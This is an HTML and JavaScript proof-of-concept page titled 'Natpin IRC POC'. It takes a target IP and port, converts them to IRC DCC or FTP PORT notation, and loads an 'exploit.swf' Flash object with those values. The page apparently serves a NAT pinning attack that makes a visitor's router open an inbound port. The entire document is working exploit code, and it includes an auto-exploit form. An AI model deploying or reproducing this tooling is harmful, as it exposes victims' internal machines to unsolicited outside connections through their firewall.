<html>
	<head>
		<title>Natpin IRC POC</title>
	</head>
	<body>
		<script>
			function getParameter(paramName) {
  				var searchString = window.location.search.substring(1),i, val, params = searchString.split("&");
				for (i=0;i<params.length;i++) {
    					val = params[i].split("=");
			    			if (val[0] == paramName) {
      							return unescape(val[1]);
		    				}
  					}
				return "";
			}
			function dot2num(dot) {
				var d = dot.split('.');
				return ((((((+d[0])*256)+(+d[1]))*256)+(+d[2]))*256)+(+d[3]);
			}
			function ftpCalcPortNotation(port){
				x = port%256
				y = (port -x)/256
				return y+","+x
			}

		</script>
 
		<br>

		<script>
		var createSwfObject = function(src, attributes, parameters) {
  			var i, html, div, obj, attr = attributes || {}, param = parameters || {};
  			attr.type = 'application/x-shockwave-flash';
  			if (window.ActiveXObject) {
    				attr.classid = 'clsid:d27cdb6e-ae6d-11cf-96b8-444553540000';
    				param.movie = src;
  			}
  			else {
    				attr.data = src;
  			}
			html = '<object';
  				for (i in attr) {
   					html += ' ' + i + '="' + attr[i] + '"';
  				}
  			html += '>';
  			for (i in param) {
    				html += '<param name="' + i + '" value="' + param[i] + '" />';
  				}
  			html += '</object>';
  			div = document.createElement('div');
  			div.innerHTML = html;
  			obj = div.firstChild;
  			div.removeChild(obj);
  			return obj;
			};

			if (getParameter("cp")==""||getParameter("ci")==""){
				//load auto-exploit screen
				document.write("<form method='GET' action='exploit.html'>\n")
				document.write("Type: <select name='type'><option value='irc'>irc</option><option value='ftp'>ftp</option></select>")
				document.write("<br>Target IP: <input type='text' value='' name='ci'/>")
				document.write("<br>Target Port: <input type='text' value='' name='cp'/>")
				document.write("<br><input type='submit' value='Go' />")
				document.write("</form>")
			}
			else{
				var proto = getParameter("type").toUpperCase()
				if (proto==""){proto="FTP"}//defaulting to ftp
				var server = getParameter("server")
				if (server==""){server= document.location.hostname}//defaulting to same host

				var callbackip = null
				var callbackport = null
				if (proto=="IRC"){
					callbackip = dot2num(getParameter("ci"))
					callbackport = getParameter("cp")
				}
				if (proto=="FTP"){
					callbackip = getParameter("ci").replace(/\./g,",")
					callbackport = ftpCalcPortNotation(getParameter("cp"))
				}
				//where dragons be
				var swfEl = createSwfObject('exploit.swf', {id: 'myid', 'class': 'myclass', width: 100, height: 100}, {wmode: 'transparent', FlashVars : 'ci='+ callbackip + '&cp='+callbackport+'&server='+ server + '&type='+proto});
				document.body.appendChild(swfEl);
			}
		</script>
	</body>
</html>
